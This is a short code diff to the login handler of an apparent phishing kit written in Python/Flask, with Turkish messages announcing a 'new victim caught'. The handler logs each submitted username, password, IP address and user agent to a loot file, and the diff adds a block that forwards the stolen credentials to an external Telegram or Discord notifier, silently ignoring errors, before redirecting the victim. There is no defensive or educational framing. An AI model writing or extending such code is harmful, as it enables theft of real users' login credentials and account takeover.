@@ -64,13 +64,19 @@ def login():
         ip_addr = request.remote_addr
         user_agent = request.headers.get('User-Agent')
         
-        print(f"\n[\033[91m!\033[0m] \033[92mYENİ KURBAN YAKALANDI!\033[0m")
-        print(f"  -> IP   : {ip_addr}")
-        print(f"  -> User : {username}")
-        print(f"  -> Pass : {password}")
+        msg = f"[\033[91m!\033[0m] \033[92mYENİ KURBAN YAKALANDI!\033[0m\n  -> IP   : {ip_addr}\n  -> User : {username}\n  -> Pass : {password}"
+        print(f"\n{msg}")
         
         with open(loot_file, "a", encoding="utf-8") as f:
             f.write(f"[{datetime.now()}] IP: {ip_addr} | User: {username} | Pass: {password} | UA: {user_agent}\n")
+            
+        # TELEGRAM / DISCORD BİLDİRİMİ GÖNDER
+        try:
+            sys.path.append(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
+            import Notifier
+            Notifier.send_alert(f"Target IP: {ip_addr}\nUsername: {username}\nPassword: {password}", title="🎣 PHISHING CREDENTIALS CAPTURED!")
+        except Exception as e:
+            pass
             
         return redirect(redirect_url)
         
